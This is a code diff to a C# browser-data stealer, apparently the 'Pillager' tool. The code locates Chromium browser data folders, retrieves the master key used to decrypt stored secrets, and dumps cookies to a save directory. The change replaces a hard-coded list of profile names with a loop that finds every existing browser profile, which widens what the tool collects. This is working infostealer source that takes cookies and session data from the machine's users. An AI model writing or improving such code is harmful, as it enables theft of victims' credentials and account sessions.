@@ -15,6 +15,8 @@ namespace Pillager.Browsers
 
         public static byte[] MasterKey { get; set; }
 
+        private static string[] profiles { get; set; }
+
         public static Dictionary<string, string> browserOnChromium = new Dictionary<string, string>
         {
             { "Chrome", "Google\\Chrome\\User Data" } ,
@@ -40,14 +42,6 @@ namespace Pillager.Browsers
             { "Iridium", "Iridium\\User Data" },
         };
 
-        private static string[] profiles = {
-        "Default",
-        "Profile 1",
-        "Profile 2",
-        "Profile 3",
-        "Profile 4",
-        "Profile 5"
-        };
 
         public static byte[] GetMasterKey()
         {
@@ -231,6 +225,17 @@ namespace Pillager.Browsers
                     BrowserPath = chromepath;
                     MasterKey = GetMasterKey();
                     if (MasterKey == null) continue;
+                    List<string> profileslist = new List<string>
+                    {
+                        "Default"
+                    };
+                    int i = 1;
+                    while (Directory.Exists(Path.Combine(BrowserPath, "Profile "+i)))
+                    {
+                        profileslist.Add("Profile " + i);
+                        i++;
+                    }
+                    profiles = profileslist.ToArray();
                     string savepath = Path.Combine(path, BrowserName);
                     Directory.CreateDirectory(savepath);
                     string cookies = Chrome_cookies();
